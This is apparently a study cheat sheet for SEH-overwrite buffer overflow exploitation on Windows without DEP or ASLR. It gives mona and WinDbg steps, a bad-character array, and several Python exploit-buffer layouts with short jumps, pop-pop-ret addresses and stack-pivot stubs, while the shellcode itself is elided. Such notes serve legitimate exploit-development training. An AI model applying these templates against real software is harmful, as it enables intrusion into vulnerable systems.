# SEH Overflow (no DEP, no ASLR)

## Step
1. Find initial crash
2. Find offset with:
```py
!py mona pc XXX 
```
3. Find badchar:

```py
bad_chars  = b"\x01\x02\x03\x04\x05\x06\x07\x08\x09\x0a\x0b\x0c\x0d\x0e\x0f\x10\x11\x12\x13\x14\x15\x16\x17\x18\x19\x1a\x1b\x1c\x1d\x1e\x1f\x20"
bad_chars += b"\x21\x22\x23\x24\x25\x26\x27\x28\x29\x2a\x2b\x2c\x2d\x2e\x2f\x30\x31\x32\x33\x34\x35\x36\x37\x38\x39\x3a\x3b\x3c\x3d\x3e\x3f\x40"
bad_chars += b"\x41\x42\x43\x44\x45\x46\x47\x48\x49\x4a\x4b\x4c\x4d\x4e\x4f\x50\x51\x52\x53\x54\x55\x56\x57\x58\x59\x5a\x5b\x5c\x5d\x5e\x5f\x60"
bad_chars += b"\x61\x62\x63\x64\x65\x66\x67\x68\x69\x6a\x6b\x6c\x6d\x6e\x6f\x70\x71\x72\x73\x74\x75\x76\x77\x78\x79\x7a\x7b\x7c\x7d\x7e\x7f\x80"
bad_chars += b"\x81\x82\x83\x84\x85\x86\x87\x88\x89\x8a\x8b\x8c\x8d\x8e\x8f\x90\x91\x92\x93\x94\x95\x96\x97\x98\x99\x9a\x9b\x9c\x9d\x9e\x9f\xa0"
bad_chars += b"\xa1\xa2\xa3\xa4\xa5\xa6\xa7\xa8\xa9\xaa\xab\xac\xad\xae\xaf\xb0\xb1\xb2\xb3\xb4\xb5\xb6\xb7\xb8\xb9\xba\xbb\xbc\xbd\xbe\xbf\xc0"
bad_chars += b"\xc1\xc2\xc3\xc4\xc5\xc6\xc7\xc8\xc9\xca\xcb\xcc\xcd\xce\xcf\xd0\xd1\xd2\xd3\xd4\xd5\xd6\xd7\xd8\xd9\xda\xdb\xdc\xdd\xde\xdf\xe0"
bad_chars += b"\xe1\xe2\xe3\xe4\xe5\xe6\xe7\xe8\xe9\xea\xeb\xec\xed\xee\xef\xf0\xf1\xf2\xf3\xf4\xf5\xf6\xf7\xf8\xf9\xfa\xfb\xfc\xfd\xfe\xff"
```
In order to find you payload you can dump the TEB and dump the EXCEPTION_REGISTRATION_RECORD.
For example:
```py
0:003> !teb
TEB at 002e3000
ExceptionList:        00edec94
StackBase:            00ee0000
StackLimit:           00edd000
SubSystemTib:         00000000
FiberData:            00001e00
ArbitraryUserPointer: 00000000
Self:                 002e3000
EnvironmentPointer:   00000000
ClientId:             0000196c . 000021bc
RpcHandle:            00000000
Tls Storage:          007f02b0
PEB Address:          002df000
LastErrorValue:       0
LastStatusValue:      c000000d
Count Owned Locks:    0
HardErrorMode:        0
```
And now you dump the \_EXCEPTION_REGISTRATION_RECORD to find NSEH
```py
0:003> dt _EXCEPTION_REGISTRATION_RECORD 00edec94
ntdll!_EXCEPTION_REGISTRATION_RECORD
+0x000 Next             : 0x00edffcc _EXCEPTION_REGISTRATION_RECORD
+0x004 Handler          : 0x77ec5b10     _EXCEPTION_DISPOSITION  ntdll!ExecuteHandler2+0

0:003> db 0x00edffcc 
00edffcc  42 42 42 42 43 43 43 43-01 02 03 04 05 06 07 08  BBBBCCCC........
00edffdc  09 0a 0b 0c 0d 0e 0f 10-11 12 13 14 15 16 17 18  ................
00edffec  19 1a 1b 1c 1d 1e 1f 20-21 22 23 24 25 26 27 28  ....... !"#$%&'(
00edfffc  29 2a 2b 2c ?? ?? ?? ??-?? ?? ?? ?? ?? ?? ?? ??  )*+,??
```
4. Find a PPR with mona and insert in the SEH
	```py
	!py mona seh -cpb '\x00'
	```
	1. If you find it, go to 5.
	2. Otherwise search for ADD ESP,XX 
	2. If you have only NULL byte, read here https://dl.packetstormsecurity.net/papers/bypass/bypassing-nullbyte.pdf
		
5. Overwrite NSEH with a short jump
```py
nasm > jmp short 8
00000000  EB06 
```
6. Now look if you have space for the shellcode
	1. If you have it, insert the shellcode and pop the calc
		```py
		  crash = b"A"*junk
		  nSEH =  b"\xeb\x06\x90\x90" #jump 8 bytes
		  SEH = struct.pack("<I",0x100195f2) #pop pop ret 
		  junk2 = b"\x90"*10
		  shellcode = "\x23\x56\..."
		  junk3 = b"D"*(total - len(crash+nSEH+SEH+junk2+shellcode))

		  buffer=b"GET "
		  buffer+=crash+nSEH+SEH+junk2+shellcode+junk3
		  buffer+=b" HTTP/1.1\r\n"
		```
    2. Otherwise:
  
    	1. Increase the SP and JMP to it. For example:
			```py
			nasm > add sp, 0x86c
			00000000  6681C46C08        add sp,0x86c


			inputBuffer = b"A" * 124
			inputBuffer+= pack("<I",0x06eb9090) # short jump 8
			inputBuffer+= pack("<I",0x100133e7) # pop edi # pop esi # ret 0x04 
			inputBuffer+= b"\x90" * 2 
			inputBuffer+= b"\x66\x81\xc4\x6C\x08"   # 6681C46C08        add sp,0x86c
			inputBuffer+= b"\xff\xe4"               # jmp esp 
			inputBuffer+= b"\x90" * (size - len(inputBuffer) - len(shellcode))
			inputBuffer+= shellcode
			```
        2. Jump back to the start of the payload (you have to calculate how much to jump)
			```py
			nasm > push esp
			\x54  
			nasm > pop eax
			\x58
			nasm > add ax, 0x5bd
			00000000  6605BD05          add ax,0x5bd
			nasm > jmp eax
			\xff\xe0

			buffer = shellcode
			buffer += b"A"*(2495-len(shellcode))
			buffer += b"\xeb\x06\x90\x90" #nseh
			buffer += pack("<I",0x10013407) #PPR  10013407
			buffer += b"\x54\x58\x66\x05\xbd\x05\xff\xe0" #jumpback
			buffer += b"\x90"*10
			buffer += b"D"*(total - len(buffer))
			```
		3. Similar to 2.
			```py
			  buf += b"B" * 129              # offset continued...
			  buf += b"\xeb\x06\x90\x90"     # nSeh      -> jmp 0x6 ; nop ; nop (jump over eip into short shellcode part below)
			  buf += pack("<I", 0x60ae1b2b)  # eip / seh -> pop ecx ; pop ecx ; ret
			  buf += b"\xb8\xc0\xf8\xff\xff" # mov eax, 0xfffff8c0 (redirect execution to top of buffer [shellcode])
			  buf += b"\xf7\xd8"             # neg eax
			  buf += b"\x01\xc4"             # add esp, eax
			  buf += b"\xff\xe4"             # jmp esp
			  buf += b"C" * 33               # required to trigger the seh overwrite rather than another crash
			```

## Resources
1. https://www.corelan.be/index.php/2009/07/25/writing-buffer-overflow-exploits-a-quick-and-basic-tutorial-part-3-seh/
2. https://epi052.gitlab.io/notes-to-self/blog/2020-05-18-osce-exam-practice-part-three/
3. https://www.ired.team/offensive-security/code-injection-process-injection/binary-exploitation/seh-based-buffer-overflow
4. https://fuzzysecurity.com/tutorials/expDev/3.html
